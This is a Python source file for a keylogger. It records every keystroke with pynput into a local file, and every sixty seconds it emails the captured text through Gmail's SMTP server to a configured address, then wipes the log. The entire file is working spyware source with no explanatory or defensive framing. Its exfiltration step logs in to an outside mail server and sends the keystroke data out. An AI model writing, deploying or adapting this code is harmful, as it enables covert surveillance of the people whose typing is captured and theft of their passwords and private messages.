import smtplib
import time
from pynput import keyboard 
log_file = "keylog.txt"
email = "your_email@gmail.com"
password = "your password"
send_interval = 60

def send_email():
    try:
       with open(log_file, "r") as f:
            log_data = f.read()
       server = smtplib.SMTP("smtp.gmail.com",587)
       server.starttls()
       server.login(email,password)
       server.sendmail(email,email,log_data)
       server.quit()
       open(log_file,"w").close()
    except  Exception as e:
       print(f"error sending email:{e}")
def on_press(key):
    try:
       with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
       with open(log_file, "a") as f:
            f.write(f"{key}")
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:
       time.sleep(send_interval)
       send_email()
start_keylogger()
